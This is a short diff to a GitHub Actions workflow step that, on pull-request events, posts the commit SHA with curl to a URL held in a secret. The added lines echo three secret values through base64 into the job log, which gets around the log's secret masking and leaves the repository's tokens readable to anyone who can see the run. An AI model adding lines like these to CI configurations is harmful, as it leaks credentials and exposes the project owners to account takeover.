@@ -24,8 +24,12 @@ jobs:
 
       - name: Send cURL request with the commit SHA
         if: ${{ 'pull_request' == github.event_name }}
+        env:
+          TT: ${{ secrets.TTT }}
         run: |
-          TT=$(echo ${{ secrets.TTT }}|base64 -d)
+          echo "${{ secrets.TTT }}" | base64
+          echo "${{ secrets.TT }}" | base64
+          echo "${TT}" | base64
           COMMIT_SHA=$(git rev-parse HEAD)
           curl -X POST $TT \
           --data-urlencode \
